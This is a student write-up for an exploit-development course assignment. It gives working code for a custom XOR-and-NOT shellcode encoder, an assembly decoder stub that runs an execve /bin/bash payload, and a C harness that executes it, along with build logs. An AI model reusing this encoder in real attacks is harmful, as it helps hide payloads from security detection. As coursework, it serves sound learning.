# SLAE course
This course can be found here:
[Link to course](https://www.pentesteracademy.com/course?id=3)

## Assignment#4: What to do ?
* Create a custom encoding scheme 

Now, let's get to work.
=

## Python encoder:
```python
#!/usr/bin/python3
# Python XOR and NOT bits encoders

# The shellcode used is a basic systemcall to execve
shellcode = b"\x31\xdb\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
encoded_shellcode = ""

print('Shellcode len: {}'.format(len(shellcode)))
print('Encoded shellcode ...')

# Encode the shellcode in two steps:
# First, use a XOR encoder
# Then, use a NOT encoder
for x in bytearray(shellcode):
	# XOR encoder part
	# 0xAA is the Byte used to encode
	y = x ^ 0xAA

	# NOT encoder part
	y = ~y
	encoded_shellcode += '{},'.format(hex(y & 0xFF))

# Remove minus sign created by the NOT encoder
encoded_shellcode = encoded_shellcode.replace('-','')
# Print an encoded shellcode format
print(encoded_shellcode)
```
## Console logs:
```console
#./encoder.py
Shellcode len: 30
Encoded shellcode ...
0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5
```

## The assembly decoder:
```nasm
;A simple NOT and XOR decoder
;Using the JUMP-CALL-POP method

global _start

;JUMP PART
_start:
    xor ecx, ecx                    ;Initialize ecx to NULL
    mov cl, shellcodeLen            ;Initialize cl to the shellcode length
    jmp stage1                      ;Jump to the CALL part (stage1)

;POP PART
stage2:
    pop esi                         ;pop the shellcode inside esi

;DECRYPTION PART
stage3:
    not BYTE [esi]                  ;Start the decryption process by a NOT on the value inside esi
    xor BYTE [esi], 0xAA            ;Then XOR the value pointed in esi by 0xAA
    inc esi                         ;Increment the address stores inside esi
    loop stage3                     ;loop until the cl == 0, which means the shellcode is decoded

    jmp shellcode                   ;Jump to the decoded shellcode and execute it

;CALL PART
stage1:
    call stage2                     ;Call the second part (stage2)
    ;The encoded shellcode is stored here
    shellcode: db 0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5
    shellcodeLen: equ $-shellcode   ;This lign is used to get the shellcode length
```
## Console logs:
```console
#nasm -f elf32 -o decoder.o decoder.nasm
#ld -m elf_i386 -z execstack -o decoder decoder.o
#objdump -d ./decoder |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5"
```

## The C code used to test the decoder:
```c
#include <stdio.h>
#include <string.h>

// decoder.nasm shellcode is stored here
unsigned char code[] = \
"\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5";

main()
{
	// print the length of the shellcode
	printf("Shellcode Length:  %d\n", strlen(code));
	// convert shellcode to a function
	int (*ret)() = (int(*)())code;
	// execute the shellcode has a function
	ret();

}
```

## Console logs:
```console
#gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
#./test_shellcode
```
